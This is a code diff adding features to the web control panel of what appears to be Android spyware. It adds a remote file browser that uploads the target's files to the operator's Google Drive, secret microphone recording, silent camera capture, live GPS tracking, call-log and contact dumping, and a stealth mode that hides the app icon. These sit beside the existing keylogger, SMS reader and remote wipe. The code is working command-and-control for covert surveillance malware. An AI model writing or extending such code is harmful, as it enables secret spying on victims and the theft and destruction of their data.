@@ -104,24 +104,39 @@
             </div>
 
             <!-- Segmented Control Tabs (Apple iOS Tab Bar) -->
-            <div class="tabs-container">
+            <div class="tabs-container" style="flex-wrap: wrap;">
                 <button class="tab-btn active" onclick="switchTab('screen')">
                     <i class="fas fa-desktop"></i> Screen Mirror & Touch
                 </button>
+                <button class="tab-btn" onclick="switchTab('gallery')">
+                    <i class="fas fa-images"></i> Media Gallery
+                </button>
+                <button class="tab-btn" onclick="switchTab('files')">
+                    <i class="fas fa-folder"></i> File Manager
+                </button>
+                <button class="tab-btn" onclick="switchTab('audio')">
+                    <i class="fas fa-microphone"></i> Audio Recorder
+                </button>
+                <button class="tab-btn" onclick="switchTab('camera')">
+                    <i class="fas fa-camera"></i> Camera Snaps
+                </button>
+                <button class="tab-btn" onclick="switchTab('location')">
+                    <i class="fas fa-map-marker-alt"></i> GPS Tracker
+                </button>
+                <button class="tab-btn" onclick="switchTab('calls')">
+                    <i class="fas fa-phone-alt"></i> Calls & Contacts
+                </button>
                 <button class="tab-btn" onclick="switchTab('keylogs')">
-                    <i class="fas fa-keyboard"></i> Keylogger & Clipboard
-                </button>
-                <button class="tab-btn" onclick="switchTab('accounts')">
-                    <i class="fas fa-user-circle"></i> Accounts
-                </button>
-                <button class="tab-btn" onclick="switchTab('apps')">
-                    <i class="fas fa-th"></i> Installed Apps
+                    <i class="fas fa-keyboard"></i> Keylogger
                 </button>
                 <button class="tab-btn" onclick="switchTab('sms')">
                     <i class="fas fa-envelope"></i> SMS Reader
                 </button>
-                <button class="tab-btn" onclick="switchTab('gallery')">
-                    <i class="fas fa-images"></i> Media Gallery
+                <button class="tab-btn" onclick="switchTab('apps')">
+                    <i class="fas fa-th"></i> Installed Apps
+                </button>
+                <button class="tab-btn" onclick="switchTab('accounts')">
+                    <i class="fas fa-user-circle"></i> Accounts
                 </button>
                 <button class="tab-btn" onclick="switchTab('notification')">
                     <i class="fas fa-paper-plane"></i> Push Notification
@@ -262,6 +277,18 @@
                                 </button>
                                 <button onclick="sendCommand('wake_screen')" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Wake Screen">
                                     <i class="fas fa-sun"></i> Wake
+                                </button>
+                                <button onclick="sendCommand('playAlarm')" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center; color: #ff453a;" title="Ring Alarm at 100% Volume">
+                                    <i class="fas fa-bullhorn"></i> Alarm
+                                </button>
+                                <button onclick="toggleTorch()" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Toggle Flashlight Torch">
+                                    <i class="fas fa-lightbulb"></i> Torch
+                                </button>
+                                <button onclick="sendCommand('vibrateDevice')" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Vibrate Device">
+                                    <i class="fas fa-mobile"></i> Vibrate
+                                </button>
+                                <button onclick="toggleHideIcon()" class="btn-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Stealth Mode (Hide/Show Launcher Icon)">
+                                    <i class="fas fa-eye-slash"></i> Stealth Icon
                                 </button>
                                 <button onclick="sendCommand('wipe_data')" class="btn-danger-ghost" style="padding: 8px 14px; border-radius: var(--radius-pill); font-size: 0.8rem; flex: 1 1 calc(25% - 8px); min-width: 80px; justify-content: center;" title="Wipe Target Data">
                                     <i class="fas fa-skull"></i> Wipe
@@ -410,6 +437,218 @@
                             <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
                                 <i class="fas fa-photo-video"></i>
                                 <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to sync entire device library to Google Drive.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: Remote File Manager & Google Drive Vault -->
+            <div id="tab-files" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                <i class="fas fa-folder-open text-primary-c"></i> Remote File Manager & Google Drive Downloader
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Browse device storage and upload any file directly to your Google Drive.
+                            </p>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <button onclick="navigateUpFolder()" class="btn-ghost" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);" title="Go Up Directory">
+                                <i class="fas fa-level-up-alt me-1"></i> Up
+                            </button>
+                            <button onclick="refreshCurrentFolder()" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-sync-alt me-1"></i> Refresh Folder
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Breadcrumbs Bar -->
+                    <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; padding: 10px 14px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; font-family: monospace; font-size: 0.8rem; color: var(--primary); overflow-x: auto;">
+                        <i class="fas fa-hdd" style="color: var(--text-muted);"></i>
+                        <span id="currentDirPath">/storage/emulated/0</span>
+                    </div>
+
+                    <!-- Files Table -->
+                    <div class="table-responsive" style="max-height: 520px; overflow-y: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Size</th>
+                                    <th>Modified</th>
+                                    <th style="text-align: right;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fileManagerList">
+                                <tr>
+                                    <td colspan="4" style="text-align: center; padding: 30px; color: var(--text-muted);">
+                                        <i class="fas fa-spinner fa-spin" style="font-size: 1.2rem; color: var(--primary); margin-bottom: 8px; display: block;"></i>
+                                        Loading directory contents...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: Ambient Audio Recorder -->
+            <div id="tab-audio" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                <i class="fas fa-microphone-alt text-primary-c"></i> Silent Ambient Audio Recorder
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Record background microphone audio secretly and auto-upload to Google Drive.
+                            </p>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <select id="audioDurationSelect" class="form-input" style="padding: 6px 12px; font-size: 0.78rem; width: auto;">
+                                <option value="30">30 Seconds</option>
+                                <option value="60" selected>1 Minute</option>
+                                <option value="300">5 Minutes</option>
+                                <option value="600">10 Minutes</option>
+                            </select>
+                            <button onclick="startAudioRecord()" class="btn-primary-glow" style="padding: 8px 18px; font-size: 0.78rem; border-radius: var(--radius-pill); font-weight: 700;">
+                                <i class="fas fa-record-vinyl me-1"></i> Start Recording
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Recordings Grid -->
+                    <div id="audioRecordsContainer" style="display: flex; flex-direction: column; gap: 12px;">
+                        <div class="empty-state"><i class="fas fa-microphone-slash"></i><p>No audio recordings found. Select duration and click 'Start Recording'.</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: Stealth Camera Snapshot -->
+            <div id="tab-camera" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                <i class="fas fa-camera-retro text-primary-c"></i> Silent Stealth Camera Snaps
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Capture secret photos without screen preview or shutter sounds directly to Google Drive.
+                            </p>
+                        </div>
+                        <div style="display: flex; gap: 10px;">
+                            <button onclick="captureCameraSnap('front')" class="btn-ghost" style="padding: 8px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-user-circle me-1" style="color: var(--primary);"></i> 📸 Front Camera Snap
+                            </button>
+                            <button onclick="captureCameraSnap('back')" class="btn-primary-glow" style="padding: 8px 18px; font-size: 0.78rem; border-radius: var(--radius-pill); font-weight: 700;">
+                                <i class="fas fa-camera me-1"></i> 📸 Back Camera Snap
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Camera Snaps Grid -->
+                    <div id="cameraSnapsGrid" class="gallery-grid">
+                        <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
+                            <i class="fas fa-camera"></i>
+                            <p>No camera snaps captured yet. Click Front/Back Snap to capture instantly.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: GPS Location Tracker -->
+            <div id="tab-location" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                <i class="fas fa-map-marked-alt text-primary-c"></i> Live GPS Location Tracker
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Real-time GPS coordinates and live interactive map explorer.
+                            </p>
+                        </div>
+                        <button onclick="forceLocationRefresh()" class="btn-primary-glow" style="padding: 8px 18px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                            <i class="fas fa-location-arrow me-1"></i> Force GPS Update
+                        </button>
+                    </div>
+
+                    <!-- Coordinates Telemetry Box -->
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px;">
+                        <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px;">
+                            <span style="font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Latitude</span>
+                            <h5 id="locLat" style="font-size: 1.1rem; color: #fff; font-family: monospace; margin: 4px 0 0 0;">--.------</h5>
+                        </div>
+                        <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px;">
+                            <span style="font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Longitude</span>
+                            <h5 id="locLng" style="font-size: 1.1rem; color: #fff; font-family: monospace; margin: 4px 0 0 0;">--.------</h5>
+                        </div>
+                        <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px;">
+                            <span style="font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Accuracy</span>
+                            <h5 id="locAcc" style="font-size: 1.1rem; color: var(--success); margin: 4px 0 0 0;">-- m</h5>
+                        </div>
+                        <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px;">
+                            <span style="font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Last Update</span>
+                            <h5 id="locTime" style="font-size: 0.9rem; color: var(--text-secondary); margin: 4px 0 0 0;">Never</h5>
+                        </div>
+                    </div>
+
+                    <!-- Map Frame -->
+                    <div style="border-radius: 16px; overflow: hidden; border: 1px solid var(--border); height: 420px; position: relative; background: #111;">
+                        <iframe id="osmMapFrame" style="width: 100%; height: 100%; border: none;" src="about:blank"></iframe>
+                        <div id="mapOverlayEmpty" style="position: absolute; inset: 0; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff;">
+                            <i class="fas fa-map-pin" style="font-size: 2.2rem; color: var(--primary); margin-bottom: 12px;"></i>
+                            <p style="font-size: 0.9rem; margin: 0;">No GPS coordinates received yet.</p>
+                            <button onclick="forceLocationRefresh()" class="btn-primary-glow" style="margin-top: 14px; padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">Request Location</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: Call Logs & Phone Contacts -->
+            <div id="tab-calls" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                <i class="fas fa-phone-volume text-primary-c"></i> Call History & Phonebook Contacts
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Comprehensive real-time call logs and full phonebook dumper.
+                            </p>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <button onclick="sendCommand('getCallLogs')" class="btn-ghost" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-sync-alt me-1" style="color: var(--primary);"></i> Fetch Call Logs
+                            </button>
+                            <button onclick="sendCommand('getContacts')" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-address-book me-1"></i> Fetch Contacts
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Sub-tabs for Calls vs Contacts -->
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                        <!-- Call Logs Column -->
+                        <div>
+                            <h5 style="font-size: 0.9rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 6px;">
+                                <i class="fas fa-phone-alt text-primary-c"></i> Call History (<span id="callCountBadge">0</span>)
+                            </h5>
+                            <div id="callLogsContainer" style="display: flex; flex-direction: column; gap: 8px; max-height: 480px; overflow-y: auto; padding-right: 4px;">
+                                <div class="empty-state"><i class="fas fa-phone-slash"></i><p>No call logs loaded.</p></div>
+                            </div>
+                        </div>
+
+                        <!-- Contacts Column -->
+                        <div>
+                            <h5 style="font-size: 0.9rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 6px;">
+                                <i class="fas fa-users text-primary-c"></i> Contacts Directory (<span id="contactsCountBadge">0</span>)
+                            </h5>
+                            <div id="contactsContainer" style="display: flex; flex-direction: column; gap: 8px; max-height: 480px; overflow-y: auto; padding-right: 4px;">
+                                <div class="empty-state"><i class="fas fa-user-friends"></i><p>No contacts loaded.</p></div>
                             </div>
                         </div>
                     </div>
@@ -1298,6 +1537,350 @@
         });
         container.innerHTML = html || '<div class="empty-state" style="grid-column: 1 / -1;"><p>No media files found.</p></div>';
     });
+
+    // ==========================================
+    // 1. Remote File Manager
+    // ==========================================
+    let currentDirPath = '/storage/emulated/0';
+
+    function refreshCurrentFolder() {
+        devRef.child('commands/listFiles').set({
+            path: currentDirPath,
+            timestamp: Date.now()
+        });
+    }
+
+    function navigateFolder(path) {
+        currentDirPath = path;
+        refreshCurrentFolder();
+    }
+
+    function navigateUpFolder() {
+        if (currentDirPath.lastIndexOf('/') > 0) {
+            currentDirPath = currentDirPath.substring(0, currentDirPath.lastIndexOf('/'));
+        } else {
+            currentDirPath = '/storage/emulated/0';
+        }
+        refreshCurrentFolder();
+    }
+
+    function downloadRemoteFile(path) {
+        devRef.child('commands/downloadFile').set({
+            path: path,
+            timestamp: Date.now()
+        });
+        alert('Download command sent! The file is being uploaded to your Google Drive Vault...');
+    }
+
+    function deleteRemoteFile(path) {
+        if (!confirm('Are you sure you want to delete this file on the target device?')) return;
+        devRef.child('commands/deleteFile').set({
+            path: path,
+            timestamp: Date.now()
+        });
+    }
+
+    devRef.child('files').on('value', snap => {
+        const data = snap.val();
+        if (!data) return;
+
+        const pathEl = document.getElementById('currentDirPath');
+        const listEl = document.getElementById('fileManagerList');
+        if (data.currentPath && pathEl) {
+            currentDirPath = data.currentPath;
+            pathEl.textContent = data.currentPath;
+        }
+
+        if (data.list && listEl) {
+            const items = Array.isArray(data.list) ? data.list : Object.values(data.list);
+            if (items.length === 0) {
+                listEl.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--text-muted);">Empty folder</td></tr>';
+                return;
+            }
+
+            let html = '';
+            items.forEach(item => {
+                const isDir = item.isDir;
+                const name = item.name || 'Unnamed';
+                const path = item.path || '';
+                const size = isDir ? '--' : (item.size > 1048576 ? (item.size / 1048576).toFixed(1) + ' MB' : (item.size / 1024).toFixed(0) + ' KB');
+                const date = item.time ? new Date(item.time).toLocaleDateString() : '--';
+                const icon = isDir ? '<i class="fas fa-folder" style="color:#ffd60a;margin-right:8px;"></i>' : '<i class="fas fa-file-alt" style="color:var(--primary);margin-right:8px;"></i>';
+
+                const actionBtns = isDir 
+                    ? `<button onclick="navigateFolder('${escapeHtml(path)}')" class="btn-ghost" style="padding:4px 10px;font-size:0.75rem;border-radius:var(--radius-pill);"><i class="fas fa-folder-open me-1"></i> Open</button>`
+                    : `<div style="display:flex;gap:6px;justify-content:flex-end;">
+                        <button onclick="downloadRemoteFile('${escapeHtml(path)}')" class="btn-primary-glow" style="padding:4px 10px;font-size:0.75rem;border-radius:var(--radius-pill);" title="Save to Google Drive"><i class="fab fa-google-drive me-1"></i> Drive</button>
+                        <button onclick="deleteRemoteFile('${escapeHtml(path)}')" class="btn-danger-ghost" style="padding:4px 8px;font-size:0.75rem;border-radius:var(--radius-pill);" title="Delete"><i class="fas fa-trash-alt"></i></button>
+                       </div>`;
+
+                html += `
+                <tr>
+                    <td style="cursor:${isDir ? 'pointer' : 'default'};" ${isDir ? `onclick="navigateFolder('${escapeHtml(path)}')"` : ''}>
+                        ${icon} <span style="font-weight:${isDir ? '600' : '400'};color:#fff;">${escapeHtml(name)}</span>
+                    </td>
+                    <td style="color:var(--text-muted);font-size:0.78rem;">${size}</td>
+                    <td style="color:var(--text-muted);font-size:0.78rem;">${date}</td>
+                    <td style="text-align:right;">${actionBtns}</td>
+                </tr>`;
+            });
+            listEl.innerHTML = html;
+        }
+    });
+
+    // ==========================================
+    // 2. Ambient Audio Recorder
+    // ==========================================
+    function startAudioRecord() {
+        const dur = parseInt(document.getElementById('audioDurationSelect').value) || 60;
+        devRef.child('commands/recordAudio').set({
+            duration: dur,
+            timestamp: Date.now()
+        });
+        alert(`Started ambient audio recording for ${dur} seconds... Audio will appear in the Google Drive Vault list below.`);
+    }
+
+    devRef.child('media/audio_records').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('audioRecordsContainer');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state"><i class="fas fa-microphone-slash"></i><p>No audio recordings found. Select duration and click \'Start Recording\'.</p></div>';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        items.sort((a, b) => (b.time || 0) - (a.time || 0));
+
+        let html = '';
+        items.forEach(rec => {
+            const name = rec.name || 'Audio Recording.m4a';
+            const date = rec.time ? new Date(rec.time).toLocaleString() : '';
+            const driveUrl = rec.driveUrl || '';
+            const directUrl = rec.directUrl || '';
+            const dur = rec.duration ? `${rec.duration}s` : 'Ambient';
+
+            html += `
+            <div style="background:rgba(255,255,255,0.035);border:1px solid var(--border);border-radius:14px;padding:16px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
+                <div style="display:flex;align-items:center;gap:14px;">
+                    <div style="width:42px;height:42px;border-radius:12px;background:rgba(255,59,48,0.12);border:1px solid rgba(255,59,48,0.3);display:flex;align-items:center;justify-content:center;">
+                        <i class="fas fa-microphone-lines" style="color:var(--primary);font-size:1.1rem;"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight:700;color:#fff;font-size:0.88rem;display:flex;align-items:center;gap:8px;">
+                            ${escapeHtml(name)}
+                            <span class="live-badge" style="font-size:0.65rem;background:rgba(48,209,88,0.15);color:#30d158;border:1px solid rgba(48,209,88,0.3);padding:1px 6px;">${dur}</span>
+                        </div>
+                        <div style="font-size:0.72rem;color:var(--text-muted);margin-top:2px;">${date}</div>
+                    </div>
+                </div>
+
+                <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:240px;justify-content:flex-end;">
+                    ${directUrl ? `<audio controls style="height:32px;outline:none;" src="${directUrl}"></audio>` : ''}
+                    ${driveUrl ? `<a href="${driveUrl}" target="_blank" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fab fa-google-drive" style="color:#30d158;margin-right:4px;"></i> Drive View</a>` : ''}
+                </div>
+            </div>`;
+        });
+        container.innerHTML = html;
+    });
+
+    // ==========================================
+    // 3. Stealth Camera Snapshot
+    // ==========================================
+    function captureCameraSnap(facing) {
+        devRef.child('commands/cameraSnap').set({
+            facing: facing,
+            timestamp: Date.now()
+        });
+        alert(`Triggered secret ${facing.toUpperCase()} camera capture... Image will upload to Google Drive Vault shortly.`);
+    }
+
+    devRef.child('media/camera_snaps').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('cameraSnapsGrid');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state" style="grid-column:1/-1;padding:30px 10px;"><i class="fas fa-camera"></i><p>No camera snaps captured yet. Click Front/Back Snap to capture instantly.</p></div>';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        items.sort((a, b) => (b.time || 0) - (a.time || 0));
+
+        let html = '';
+        items.forEach((item, index) => {
+            const src = item.directUrl || item.url || '';
+            const driveUrl = item.driveUrl || '';
+            const name = item.name || `Camera_Snap_${index + 1}.jpg`;
+            const date = item.time ? new Date(item.time).toLocaleString() : '';
+            const facing = (item.facing || 'back').toUpperCase();
+
+            if (src) {
+                html += `
+                <div class="gallery-card" style="position:relative;" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} (${facing})', '${driveUrl}')">
+                    <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
+                    <span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>
+                    <span style="position:absolute;bottom:35px;left:8px;background:rgba(255,59,48,0.85);color:#fff;font-size:0.65rem;padding:2px 7px;border-radius:6px;font-weight:700;">${facing}</span>
+                    <div class="gallery-card-overlay">
+                        <span class="gallery-card-name">${escapeHtml(name)}</span>
+                        <div class="gallery-card-meta">
+                            <span>${date}</span>
+                        </div>
+                    </div>
+                </div>`;
+            }
+        });
+        container.innerHTML = html || '<div class="empty-state" style="grid-column:1/-1;"><p>No valid snapshots found.</p></div>';
+    });
+
+    // ==========================================
+    // 4. GPS Location Tracker
+    // ==========================================
+    function forceLocationRefresh() {
+        devRef.child('commands/forceLocation').set({
+            timestamp: Date.now()
+        });
+        alert("Requested high-accuracy GPS coordinates from device...");
+    }
+
+    devRef.child('location').on('value', snap => {
+        const loc = snap.val();
+        if (!loc || !loc.lat || !loc.lng) return;
+
+        const lat = parseFloat(loc.lat);
+        const lng = parseFloat(loc.lng);
+        const acc = loc.accuracy ? parseFloat(loc.accuracy).toFixed(0) : '--';
+        const time = loc.time ? new Date(loc.time).toLocaleTimeString() : 'Just now';
+
+        const latEl = document.getElementById('locLat');
+        const lngEl = document.getElementById('locLng');
+        const accEl = document.getElementById('locAcc');
+        const timeEl = document.getElementById('locTime');
+        const overlay = document.getElementById('mapOverlayEmpty');
+        const frame = document.getElementById('osmMapFrame');
+
+        if (latEl) latEl.textContent = lat.toFixed(6);
+        if (lngEl) lngEl.textContent = lng.toFixed(6);
+        if (accEl) accEl.textContent = `${acc} m`;
+        if (timeEl) timeEl.textContent = time;
+        if (overlay) overlay.style.display = 'none';
+
+        if (frame) {
+            const bbox = `${lng - 0.008},${lat - 0.008},${lng + 0.008},${lat + 0.008}`;
+            frame.src = `https://www.openstreetmap.org/export/embed.html?bbox=${encodeURIComponent(bbox)}&layer=mapnik&marker=${lat}%2C${lng}`;
+        }
+    });
+
+    // ==========================================
+    // 5. Calls & Contacts
+    // ==========================================
+    devRef.child('calls/list').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('callLogsContainer');
+        const badge = document.getElementById('callCountBadge');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state"><i class="fas fa-phone-slash"></i><p>No call logs loaded. Click \'Fetch Call Logs\' above.</p></div>';
+            if (badge) badge.textContent = '0';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        if (badge) badge.textContent = items.length;
+
+        let html = '';
+        items.forEach(c => {
+            const name = c.name || 'Unknown';
+            const num = c.number || '';
+            const type = c.type || 'Call';
+            const date = c.time ? new Date(c.time).toLocaleString() : '';
+            const dur = c.duration ? `${c.duration}s` : '0s';
+
+            const color = type === 'Incoming' ? '#30d158' : (type === 'Outgoing' ? '#0a84ff' : '#ff453a');
+            const icon = type === 'Incoming' ? 'fa-phone-arrow-down-left' : (type === 'Outgoing' ? 'fa-phone-arrow-up-right' : 'fa-phone-slash');
+
+            html += `
+            <div style="background:rgba(255,255,255,0.035);border:1px solid var(--border);border-left:4px solid ${color};border-radius:12px;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;">
+                <div>
+                    <div style="font-weight:700;color:#fff;font-size:0.86rem;display:flex;align-items:center;gap:6px;">
+                        <i class="fas ${icon}" style="color:${color};font-size:0.8rem;"></i>
+                        ${escapeHtml(name)}
+                    </div>
+                    <div style="font-size:0.75rem;color:var(--text-muted);margin-top:2px;font-family:monospace;">${escapeHtml(num)}</div>
+                </div>
+                <div style="text-align:right;">
+                    <span class="live-badge" style="font-size:0.65rem;background:rgba(255,255,255,0.06);color:${color};">${type} • ${dur}</span>
+                    <div style="font-size:0.68rem;color:var(--text-muted);margin-top:4px;">${date}</div>
+                </div>
+            </div>`;
+        });
+        container.innerHTML = html;
+    });
+
+    devRef.child('contacts/list').on('value', snap => {
+        const data = snap.val();
+        const container = document.getElementById('contactsContainer');
+        const badge = document.getElementById('contactsCountBadge');
+        if (!container) return;
+
+        if (!data) {
+            container.innerHTML = '<div class="empty-state"><i class="fas fa-user-friends"></i><p>No contacts loaded. Click \'Fetch Contacts\' above.</p></div>';
+            if (badge) badge.textContent = '0';
+            return;
+        }
+
+        const items = Array.isArray(data) ? data : Object.values(data);
+        if (badge) badge.textContent = items.length;
+
+        let html = '';
+        items.forEach(ct => {
+            const name = ct.name || 'Unnamed';
+            const num = ct.number || '';
+
+            html += `
+            <div style="background:rgba(255,255,255,0.035);border:1px solid var(--border);border-radius:12px;padding:10px 14px;display:flex;align-items:center;gap:12px;">
+                <div style="width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;color:var(--primary);font-weight:700;font-size:0.85rem;">
+                    ${name.charAt(0).toUpperCase()}
+                </div>
+                <div style="flex:1;">
+                    <div style="font-weight:600;color:#fff;font-size:0.85rem;">${escapeHtml(name)}</div>
+                    <a href="tel:${encodeURIComponent(num)}" style="font-size:0.74rem;color:var(--primary);font-family:monospace;text-decoration:none;">${escapeHtml(num)}</a>
+                </div>
+            </div>`;
+        });
+        container.innerHTML = html;
+    });
+
+    // ==========================================
+    // 6. Quick Hardware Action Handlers
+    // ==========================================
+    function toggleTorch() {
+        devRef.child('settings/torchOn').once('value', snap => {
+            const current = snap.val() || false;
+            devRef.child('commands/toggleTorch').set({
+                on: !current,
+                timestamp: Date.now()
+            });
+            alert(`Flashlight command sent: Turning ${!current ? 'ON' : 'OFF'}...`);
+        });
+    }
+
+    function toggleHideIcon() {
+        devRef.child('settings/iconHidden').once('value', snap => {
+            const current = snap.val() || false;
+            const willHide = !current;
+            if (confirm(willHide ? 'Are you sure you want to HIDE the app icon from the device home screen?' : 'Are you sure you want to RESTORE the app icon on the home screen?')) {
+                devRef.child('commands/hideAppIcon').set({
+                    hide: willHide,
+                    timestamp: Date.now()
+                });
+                alert(`Stealth command sent: App icon will be ${willHide ? 'HIDDEN' : 'RESTORED'}.`);
+            }
+        });
+    }
     </script>
 </body>
 </html>
